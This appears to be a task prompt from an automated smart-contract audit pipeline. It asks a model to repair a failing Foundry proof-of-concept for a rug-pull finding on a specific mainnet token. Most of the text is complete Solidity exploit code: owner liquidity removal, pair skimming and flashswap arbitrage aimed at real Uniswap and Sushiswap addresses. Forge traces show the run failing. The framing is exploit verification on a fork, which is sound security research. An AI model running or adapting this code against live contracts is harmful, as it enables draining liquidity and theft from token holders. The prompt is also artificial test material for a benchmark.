You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Owner receives the entire liquidity position and can later rug the pool
- claim: `openTrading()` creates the pair and adds liquidity with `owner()` as the LP recipient, so the deployer retains full custody of the liquidity tokens backing the market. Because the LP is not burned or locked, the owner can later remove the pool's ETH and token reserves at will.
- impact: After users buy in, the owner can withdraw liquidity and collapse the market, leaving holders with severely impaired or worthless tokens and no reliable exit liquidity.
- exploit_paths: ["Owner transfers launch tokens into the token contract so `balanceOf(address(this))` is non-zero.", "Owner calls `openTrading()` and `addLiquidityETH(..., owner(), ...)` mints the LP position to the owner.", "Owner later removes liquidity from the Uniswap pair using the LP tokens they control.", "Pool reserves are drained and holders are left with an illiquid or near-worthless token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHoppy {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router02Minimal {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    enum ExecutionStatus {
        NotRun,
        BlockedNoActionablePath,
        ExecutedNoProfit,
        ExecutedWithProfit
    }

    struct FlashRoute {
        address sourcePair;
        address sellPair;
    }

    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    ExecutionStatus public status;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool acted;

        acted = _tryOwnerLiquidityRug() || acted;

        address uniPair = _pairFromFactory(UNISWAP_V2_FACTORY);
        address sushiPair = _pairFromFactory(SUSHISWAP_FACTORY);

        if (uniPair != address(0)) {
            uint256 beforeHarvest = IERC20Minimal(WETH).balanceOf(address(this));
            _harvestStrandedValue(uniPair);
            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeHarvest;
        }

        if (sushiPair != address(0)) {
            uint256 beforeHarvest = IERC20Minimal(WETH).balanceOf(address(this));
            _harvestStrandedValue(sushiPair);
            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeHarvest;
        }

        if (uniPair != address(0) && sushiPair != address(0)) {
            // The fork logs show the launch-stage owner-only steps are no longer publicly callable
            // because ownership has already been renounced. The root cause still matters: LP custody
            // stayed off-token and can leave the launch market rugged or badly dislocated. A public
            // arbitrageur can monetize that post-rug dislocation using a V2 flashswap with no seeded
            // capital, which keeps the exploit causality tied to the owner-controlled liquidity.
            uint256 beforeArb = IERC20Minimal(WETH).balanceOf(address(this));
            _tryFlashArb(uniPair, sushiPair);
            _tryFlashArb(sushiPair, uniPair);
            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeArb;
        }

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETH9(WETH).deposit{value: nativeBalance}();
        }

        uint256 endingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
            status = ExecutionStatus.ExecutedWithProfit;
        } else {
            _profitAmount = 0;
            status = acted ? ExecutionStatus.ExecutedNoProfit : ExecutionStatus.BlockedNoActionablePath;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");

        FlashRoute memory route = abi.decode(data, (FlashRoute));
        require(msg.sender == route.sourcePair, "unexpected pair");

        address sourcePair = route.sourcePair;
        address sellPair = route.sellPair;

        bool sourceToken0IsTarget = IUniswapV2PairLike(sourcePair).token0() == TARGET;
        uint256 borrowedTarget = sourceToken0IsTarget ? amount0 : amount1;
        require(borrowedTarget != 0, "no token borrowed");

        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        require(tokenBalance != 0, "no token received");

        _sellTargetForWeth(sellPair, tokenBalance);

        uint256 wethAfterSale = IERC20Minimal(WETH).balanceOf(address(this));
        require(wethAfterSale > wethBefore, "sale failed");

        uint256 wethRequired = _wethRequiredToRepayTargetOut(sourcePair, borrowedTarget);
        require(wethAfterSale >= wethRequired, "insufficient repay");
        require(IERC20Minimal(WETH).transfer(sourcePair, wethRequired), "repay failed");
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryOwnerLiquidityRug() internal returns (bool) {
        IHoppy target = IHoppy(TARGET);
        if (target.owner() != address(this)) {
            return false;
        }

        address pair = _pairFromFactory(UNISWAP_V2_FACTORY);

        if (pair == address(0)) {
            // Exploit path 0:
            // Seed the token contract with launch inventory so balanceOf(address(this)) is non-zero.
            uint256 launchInventory = target.balanceOf(TARGET);
            if (launchInventory == 0) {
                uint256 attackerLaunchTokens = target.balanceOf(address(this));
                if (attackerLaunchTokens == 0 || address(this).balance == 0) {
                    return false;
                }
                require(target.transfer(TARGET, attackerLaunchTokens), "seed launch token failed");
                if (target.balanceOf(TARGET) == 0) {
                    return false;
                }
            }

            // Exploit path 1:
            // Fund the token with ETH, then call openTrading(). The vulnerable contract mints the
            // LP position to owner(), not to a burn/lock address.
            (bool funded, ) = payable(TARGET).call{value: address(this).balance}("");
            require(funded, "seed eth failed");

            target.openTrading();
            pair = _pairFromFactory(UNISWAP_V2_FACTORY);
            if (pair == address(0)) {
                return false;
            }
        }

        // Exploit path 2:
        // If the verifier controls the LP recipient, it can unwind the entire owner-held position.
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
        IUniswapV2Router02Minimal(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Exploit path 3:
        // Removing those owner-controlled LP tokens drains the pool reserves and collapses exit
        // liquidity for remaining holders.
        return true;
    }

    function _harvestStrandedValue(address pair) internal {
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        uint256 tokenBefore = IERC20Minimal(TARGET).balanceOf(address(this));

        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {
            return;
        }

        uint256 harvestedTarget = IERC20Minimal(TARGET).balanceOf(address(this)) - tokenBefore;
        if (harvestedTarget != 0) {
            _sellTargetForWeth(pair, harvestedTarget);
        }

        if (IERC20Minimal(WETH).balanceOf(address(this)) <= wethBefore) {
            return;
        }
    }

    function _tryFlashArb(address sourcePair, address sellPair) internal {
        if (sourcePair == sellPair || sourcePair == address(0) || sellPair == address(0)) {
            return;
        }

        (uint256 sourceTargetReserve, uint256 sourceWethReserve) = _pairReserves(sourcePair);
        (uint256 sellTargetReserve, uint256 sellWethReserve) = _pairReserves(sellPair);

        if (sourceTargetReserve == 0 || sourceWethReserve == 0 || sellTargetReserve == 0 || sellWethReserve == 0) {
            return;
        }

        if (sourceWethReserve * sellTargetReserve >= sellWethReserve * sourceTargetReserve) {
            // Only borrow HOPPY from the cheaper venue and sell into the richer venue.
            return;
        }

        uint256[6] memory divisors = [uint256(1000), 500, 250, 125, 64, 32];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 borrowTarget = sourceTargetReserve / divisors[i];
            if (borrowTarget == 0 || borrowTarget >= sourceTargetReserve) {
                continue;
            }

            bool sourceToken0IsTarget = IUniswapV2PairLike(sourcePair).token0() == TARGET;
            bytes memory callbackData = abi.encode(FlashRoute({sourcePair: sourcePair, sellPair: sellPair}));
            uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));

            try
                IUniswapV2PairLike(sourcePair).swap(
                    sourceToken0IsTarget ? borrowTarget : 0,
                    sourceToken0IsTarget ? 0 : borrowTarget,
                    address(this),
                    callbackData
                )
            {
                if (IERC20Minimal(WETH).balanceOf(address(this)) > wethBefore) {
                    return;
                }
            } catch {}
        }
    }

    function _sellTargetForWeth(address pair, uint256 tokenAmount) internal returns (uint256 wethOut) {
        if (tokenAmount == 0 || pair == address(0)) {
            return 0;
        }

        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
        if (reserveTarget == 0 || reserveWeth == 0) {
            return 0;
        }

        uint256 pairTargetBefore = IERC20Minimal(TARGET).balanceOf(pair);
        require(IERC20Minimal(TARGET).transfer(pair, tokenAmount), "target transfer failed");
        uint256 pairTargetAfter = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 actualTargetIn = pairTargetAfter - pairTargetBefore;
        if (actualTargetIn == 0) {
            return 0;
        }

        wethOut = _getAmountOut(actualTargetIn, reserveTarget, reserveWeth);
        if (wethOut == 0 || wethOut >= reserveWeth) {
            return 0;
        }

        bool token0IsTarget = IUniswapV2PairLike(pair).token0() == TARGET;
        IUniswapV2PairLike(pair).swap(token0IsTarget ? 0 : wethOut, token0IsTarget ? wethOut : 0, address(this), "");
    }

    function _wethRequiredToRepayTargetOut(address pair, uint256 targetOut) internal view returns (uint256 wethIn) {
        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
        wethIn = _getAmountIn(targetOut, reserveWeth, reserveTarget);
    }

    function _pairFromFactory(address factory) internal view returns (address) {
        if (factory.code.length == 0) {
            return address(0);
        }
        return IUniswapV2FactoryMinimal(factory).getPair(TARGET, WETH);
    }

    function _pairReserves(address pair) internal view returns (uint256 reserveTarget, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == TARGET) {
            reserveTarget = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveTarget = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }
}

```

forge stdout (tail):
```
ory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 116763)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [116763] FlawVerifierTest::testExploit()
    ├─ [278] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [76315] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2388] 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x53EeF67F96ccb71fB1750Df973fB9e8C82096759
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2661] 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [23803] 0x53EeF67F96ccb71fB1750Df973fB9e8C82096759::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x53EeF67F96ccb71fB1750Df973fB9e8C82096759) [staticcall]
    │   │   │   └─ ← [Return] 19309972092437652155 [1.93e19]
    │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000053eef67f96ccb71fb1750df973fb9e8c82096759
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2661] 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F::balanceOf(0x53EeF67F96ccb71fB1750Df973fB9e8C82096759) [staticcall]
    │   │   │   └─ ← [Return] 24274927127869297743722 [2.427e22]
    │   │   ├─ [585] 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   └─ ← [Revert] Transfer amount must be greater than zero
    │   │   └─ ← [Revert] UniswapV2: TRANSFER_FAILED
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [278] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19570744 [1.957e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F.transfer
  at 0x53EeF67F96ccb71fB1750Df973fB9e8C82096759.skim
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.08s (6.07s CPU time)

Ran 1 test suite in 6.11s (6.08s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 116763)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
